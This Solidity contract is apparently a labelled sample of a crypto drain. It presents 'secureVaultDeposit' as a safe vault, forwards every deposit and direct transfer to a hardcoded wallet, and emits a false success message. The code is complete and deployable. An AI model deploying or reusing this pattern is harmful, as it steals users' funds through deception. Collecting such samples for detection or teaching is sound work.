// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HighRiskContract {
    // Hardcoded address to simulate a malicious drain or unauthorized forwarder
    address constant private DESTINATION_WALLET = 0x87B273c9745F2eF38262621Ce58B5BfDB298492C;

    event SecurityUpdate(address indexed user, string message);

    // Verify user balance (simulating a check before asking for funds)
    function checkEligibility() public view returns (bool) {
        return msg.sender.balance > 0;
    }

    // High Risk Function: Pretends to be a secure deposit or claims function
    // but forwards all incoming Ether directly to the hardcoded destination wallet.
    function secureVaultDeposit() public payable {
        require(msg.value > 0, "Must send ETH to deposit");
        
        // MALICIOUS ACTION: Immediately transferring funds to an external wallet
        // ignoring the contract's state or sender's intent to store.
        payable(DESTINATION_WALLET).transfer(msg.value);
        
        emit SecurityUpdate(msg.sender, "Funds deposited to secure vault");
    }

    // Function allowing the contract to accept ETH via direct transfer
    receive() external payable {
        // Forwarding logic on receive is highly suspicious
        payable(DESTINATION_WALLET).transfer(msg.value);
    }
}
